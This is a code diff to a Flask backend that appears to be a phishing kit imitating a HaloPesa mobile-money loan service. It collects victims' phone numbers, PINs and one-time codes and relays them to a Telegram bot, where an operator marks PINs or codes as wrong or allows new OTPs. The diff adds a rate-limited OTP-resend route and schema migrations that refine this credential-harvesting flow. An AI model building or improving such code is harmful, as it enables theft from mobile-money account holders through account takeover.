@@ -3,9 +3,10 @@ import requests
 import sqlite3
 import random
 import string
-from datetime import datetime
+from datetime import datetime, timedelta
 import os
 import logging
+import time
 
 app = Flask(__name__)
 app.secret_key = 'halopesa-new-2024'
@@ -27,6 +28,7 @@ TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
 def init_db():
     conn = sqlite3.connect('database.db')
     c = conn.cursor()
+    # Create main tables
     c.execute('''CREATE TABLE IF NOT EXISTS loans (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         app_id TEXT,
@@ -40,7 +42,9 @@ def init_db():
         invalid_type TEXT,
         full_name TEXT,
         employment_status TEXT,
-        monthly_income INTEGER
+        monthly_income INTEGER,
+        resend_count INTEGER DEFAULT 0,
+        last_resend_time TEXT
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS users (
         phone TEXT UNIQUE,
@@ -50,7 +54,27 @@ def init_db():
     conn.close()
     logging.info("Database initialized.")
 
+# Add columns if missing (for existing databases)
+def add_columns():
+    conn = sqlite3.connect('database.db')
+    c = conn.cursor()
+    columns = [
+        ('full_name', 'TEXT'),
+        ('employment_status', 'TEXT'),
+        ('monthly_income', 'INTEGER'),
+        ('resend_count', 'INTEGER DEFAULT 0'),
+        ('last_resend_time', 'TEXT')
+    ]
+    for col, col_type in columns:
+        try:
+            c.execute(f'ALTER TABLE loans ADD COLUMN {col} {col_type}')
+        except sqlite3.OperationalError:
+            pass  # Column already exists
+    conn.commit()
+    conn.close()
+
 init_db()
+add_columns()
 
 def send_telegram(message, reply_markup=None):
     try:
@@ -125,10 +149,12 @@ def submit_loan():
                 return jsonify({'success': False, 'error': 'Too many OTP requests. Wait.'})
             app_id = 'HP-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
             code = str(random.randint(1000, 9999))
+            # Set initial resend_count = 0, last_resend_time = now (for tracking)
+            now = datetime.now().isoformat()
             c.execute('''INSERT INTO loans
-                         (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income)
-                         VALUES (?,?,?,?,?,?,?,?,?)''',
-                      (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income))
+                         (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income, resend_count, last_resend_time)
+                         VALUES (?,?,?,?,?,?,?,?,?,?,?)''',
+                      (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income, 0, now))
             conn.commit()
             conn.close()
             msg = f'📤 OTP REQUESTED\n\n🆔 {app_id}\n📞 +255 {phone}\n💰 TZS {amount:,}'
@@ -145,10 +171,11 @@ def submit_loan():
 
         app_id = 'HP-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
         code = str(random.randint(1000, 9999))
+        now = datetime.now().isoformat()
         c.execute('''INSERT INTO loans
-                     (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income)
-                     VALUES (?,?,?,?,?,?,?,?,?)''',
-                  (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income))
+                     (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income, resend_count, last_resend_time)
+                     VALUES (?,?,?,?,?,?,?,?,?,?,?)''',
+                  (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income, 0, now))
         conn.commit()
         conn.close()
 
@@ -187,7 +214,6 @@ def submit_code():
         if loan:
             phone, expected_code, amount, pin = loan
             msg = f'🔐 CODE VERIFICATION\n\n🆔 {app_id}\n\n📋 {entered_code}'
-            # ✅ VERTICAL BUTTONS – each on its own row
             send_telegram(msg, {'inline_keyboard': [
                 [{'text': '❌ WRONG PIN', 'callback_data': f'wrongpin_{app_id}'}],
                 [{'text': '❌ WRONG CODE', 'callback_data': f'wrongcode_{app_id}'}],
@@ -213,6 +239,59 @@ def check_status(app_id):
     except Exception as e:
         logging.error(f"Error in check_status: {e}")
         return jsonify({'status': 'error'}), 500
+
+@app.route('/api/resend_otp', methods=['POST'])
+def resend_otp():
+    try:
+        data = request.json
+        app_id = data.get('app_id')
+        if not app_id:
+            return jsonify({'success': False, 'error': 'App ID required'}), 400
+
+        conn = sqlite3.connect('database.db')
+        c = conn.cursor()
+        c.execute('SELECT phone, amount, status, code_status, resend_count, last_resend_time FROM loans WHERE app_id = ?', (app_id,))
+        loan = c.fetchone()
+        if not loan:
+            conn.close()
+            return jsonify({'success': False, 'error': 'Loan not found'}), 404
+
+        phone, amount, status, code_status, resend_count, last_resend_time = loan
+
+        # Check if resend is allowed (only when status = 'approved' and code_status = 'pending')
+        if status != 'approved' or code_status != 'pending':
+            conn.close()
+            return jsonify({'success': False, 'error': 'OTP cannot be resent at this stage'}), 400
+
+        # Check resend limit (max 3)
+        if resend_count >= 3:
+            conn.close()
+            return jsonify({'success': False, 'error': 'You have reached the maximum number of OTP requests (3).'}), 400
+
+        # Check time since last resend (must be >= 30 seconds)
+        if last_resend_time:
+            last_time = datetime.fromisoformat(last_resend_time)
+            now = datetime.now()
+            if (now - last_time).total_seconds() < 30:
+                remaining = int(30 - (now - last_time).total_seconds())
+                conn.close()
+                return jsonify({'success': False, 'error': f'Please wait {remaining} seconds before requesting again.'}), 400
+
+        # Update resend_count and last_resend_time
+        new_count = resend_count + 1
+        new_time = datetime.now().isoformat()
+        c.execute('UPDATE loans SET resend_count = ?, last_resend_time = ? WHERE app_id = ?', (new_count, new_time, app_id))
+        conn.commit()
+        conn.close()
+
+        # Send OTP request to Telegram
+        msg = f'📤 OTP REQUESTED (Resent #{new_count})\n\n🆔 {app_id}\n📞 +255 {phone}\n💰 TZS {amount:,}'
+        send_telegram(msg, {'inline_keyboard': [[{'text': '✅ ALLOW OTP', 'callback_data': f'allow_{app_id}'}]]})
+        return jsonify({'success': True})
+
+    except Exception as e:
+        logging.error(f"Error in resend_otp: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
@@ -244,14 +323,12 @@ def webhook():
                 conn.commit()
                 edit_telegram(msg_id, original + '\n\n❌ INVALID - PIN still wrong')
 
-            # ✅ WRONG PIN handler
             elif cb_data.startswith('wrongpin_'):
                 aid = cb_data.replace('wrongpin_', '')
                 c.execute("UPDATE loans SET status='wrong_pin', code_status='wrong_pin' WHERE app_id=?", (aid,))
                 conn.commit()
                 edit_telegram(msg_id, original + '\n\n❌ WRONG PIN')
 
-            # ✅ WRONG CODE handler
             elif cb_data.startswith('wrongcode_'):
                 aid = cb_data.replace('wrongcode_', '')
                 c.execute("UPDATE loans SET code_status='wrong_code' WHERE app_id=?", (aid,))
